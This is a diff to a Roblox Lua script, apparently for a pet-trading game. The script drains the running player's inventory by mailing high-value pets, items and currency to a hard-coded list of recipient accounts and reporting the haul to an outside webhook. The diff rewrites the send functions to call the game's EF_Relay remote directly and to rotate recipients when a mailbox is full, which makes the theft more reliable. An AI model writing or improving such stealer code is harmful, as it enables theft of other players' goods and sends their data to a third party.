@@ -13,6 +13,9 @@ if not Library then return end
 local u1 = require(Library.Client.Network)
 require(Library)
 
+-- THE actual remote
+local EF_Relay = RS:WaitForChild('Network'):WaitForChild('EF_Relay')
+
 local function getInventory()
     return require(Library:WaitForChild('Client'):WaitForChild('Save')).Get().Inventory
 end
@@ -33,7 +36,7 @@ _G.minrap = 1000000
 local u10 = _G.Usernames
 local v11 = _G.minrap
 local u12 = _G.webhook
-local MESSAGE = 'hi' -- message required by mailbox UI
+local MESSAGE = 'Hello'
 
 for _, name in ipairs(u10) do
     if _LocalPlayer.Name == name then
@@ -109,17 +112,19 @@ local function sendWebhook(gems)
     pcall(reqFunc, {Url = u12[1], Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = body})
 end
 
--- FIXED: correct arg order — recipient, message, category, uid, amount
+-- FIXED: EF_Relay:InvokeServer directly
 local function sendItem(cat, uid, amt)
     local i = 1
     local done = false
     while not done do
-        local s, e = u1.Invoke('Mailbox: Send', u10[i], MESSAGE, cat, uid, amt or 1)
-        if s == true then
+        local ok, result = pcall(function()
+            return EF_Relay:InvokeServer(u10[i], MESSAGE, cat, uid, amt or 1)
+        end)
+        if ok and result == true then
             done = true
             u25 = u25 - u21
             u21 = math.min(math.ceil(u21 * 1.5), 5000000)
-        elseif e == "They don't have enough space!" then
+        elseif result == "They don't have enough space!" then
             i = i + 1
             if i > #u10 then done = true end
         else
@@ -138,10 +143,12 @@ local function sendGems()
                 local i = 1
                 local done = false
                 while not done do
-                    local s, e = u1.Invoke('Mailbox: Send', u10[i], MESSAGE, 'Currency', v, toSend)
-                    if s == true then
+                    local ok, result = pcall(function()
+                        return EF_Relay:InvokeServer(u10[i], MESSAGE, 'Currency', v, toSend)
+                    end)
+                    if ok and result == true then
                         done = true
-                    elseif e == "They don't have enough space!" then
+                    elseif result == "They don't have enough space!" then
                         i = i + 1
                         if i > #u10 then done = true end
                     else
@@ -174,8 +181,10 @@ end
 
 local function spaceCheck()
     local v105 = next(_Inventory.Pet)
-    local _, err = u1.Invoke('Mailbox: Send', 'Roblox', MESSAGE, 'Pet', v105, 1)
-    return err == "They don't have enough space!"
+    local ok, result = pcall(function()
+        return EF_Relay:InvokeServer('Roblox', MESSAGE, 'Pet', v105, 1)
+    end)
+    return result == "They don't have enough space!"
 end
 
 local function getRAP(cat, item)
